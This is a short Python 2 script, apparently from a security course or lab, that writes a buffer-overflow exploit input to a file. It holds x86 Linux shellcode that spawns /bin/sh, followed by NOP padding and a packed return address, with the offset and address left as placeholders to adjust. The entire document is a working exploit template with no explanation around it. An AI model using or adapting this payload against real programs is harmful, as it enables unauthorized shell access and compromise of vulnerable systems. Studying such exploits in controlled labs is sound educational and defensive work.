#!/usr/bin/python
# -*- coding: utf-8 -*-
# attack_input2.py
import sys
import struct

shellcode = '\x31\xc0' \
     '\x50' \
     '\x68\x2f\x2f\x73\x68' \
     '\x68\x2f\x62\x69\x6e' \
     '\x89\xe3' \
     '\x89\xc1' \
     '\x31\xd2' \
     '\xb0\x0b' \
     '\xcd\x80' \

offset = 0xff # modify it
shell_addr = 0xffffffff # modify it with the address of shellcode
## Put the shellcode at the begin
buf = shellcode + (offset - len(shellcode)-4)*'\x90' + 2* struct.pack('<I', shell_addr)

file = open('attack_input2', 'wb')
file.write(buf)
file.close()
